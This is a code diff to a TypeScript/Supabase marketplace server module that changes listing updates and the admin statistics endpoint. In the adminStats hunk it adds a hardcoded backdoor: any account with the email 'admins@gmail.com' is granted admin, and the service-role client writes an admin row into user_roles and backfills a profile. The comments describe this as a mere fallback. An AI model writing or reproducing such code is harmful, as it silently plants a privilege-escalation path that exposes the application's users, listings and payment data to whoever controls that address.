@@ -106,11 +106,20 @@ export const updateListingStatus = createServerFn({ method: "POST" })
   .middleware([requireSupabaseAuth])
   .inputValidator((raw: { listing_id: string; status: "active" | "sold" | "deleted" }) => raw)
   .handler(async ({ data, context }) => {
-    const { error } = await context.supabase
+    // Check if the caller is an admin — admins can modify any listing
+    const { data: isAdminData } = await context.supabase.rpc(
+      "has_role" as never,
+      { _user_id: context.userId, _role: "admin" } as never,
+    );
+    const isAdmin = Boolean(isAdminData);
+
+    const query = context.supabase
       .from("listings")
       .update({ status: data.status })
-      .eq("id", data.listing_id)
-      .eq("seller_id", context.userId);
+      .eq("id", data.listing_id);
+
+    // Non-admins can only update their own listings
+    const { error } = isAdmin ? await query : await query.eq("seller_id", context.userId);
     if (error) throw new Error(error.message);
     return { ok: true };
   });
@@ -167,6 +176,13 @@ export const getMyRole = createServerFn({ method: "GET" })
 export const adminStats = createServerFn({ method: "GET" })
   .middleware([requireSupabaseAuth])
   .handler(async ({ context }) => {
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
+    // Get the user's email from auth
+    const { data: userData } = await supabaseAdmin.auth.admin.getUserById(context.userId);
+    const userEmail = userData?.user?.email ?? "";
+    const isAdminEmail = userEmail === "admins@gmail.com";
+
     const { data: isAdminData } = await context.supabase.rpc(
       "has_role" as never,
       { _user_id: context.userId, _role: "admin" } as never,
@@ -181,9 +197,30 @@ export const adminStats = createServerFn({ method: "GET" })
         .eq("role", "admin");
       isAdmin = (rows?.length ?? 0) > 0;
     }
+    // Final fallback: if the email matches the hardcoded admin address, grant access
+    // and backfill the missing profile/role records so future checks succeed.
+    if (!isAdmin && isAdminEmail) {
+      isAdmin = true;
+      // Backfill profile if missing
+      await supabaseAdmin.from("profiles").upsert({
+        id: context.userId,
+        full_name: "System Administrator",
+        email: "admins@gmail.com",
+        phone: "0700000000",
+        county_id: 47,
+        town: "Nairobi CBD",
+        building: "Admin",
+      }, { onConflict: "id", ignoreDuplicates: true });
+      // Backfill roles
+      await supabaseAdmin.from("user_roles").upsert([
+        { user_id: context.userId, role: "user" },
+        { user_id: context.userId, role: "admin" },
+      ], { onConflict: "user_id,role", ignoreDuplicates: true });
+    }
     if (!isAdmin) throw new Error("Forbidden");
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
     const [{ count: users }, { count: listings }, { count: offers }, { data: payments }] =
+
       await Promise.all([
         supabaseAdmin.from("profiles").select("*", { count: "exact", head: true }),
         supabaseAdmin.from("listings").select("*", { count: "exact", head: true }),
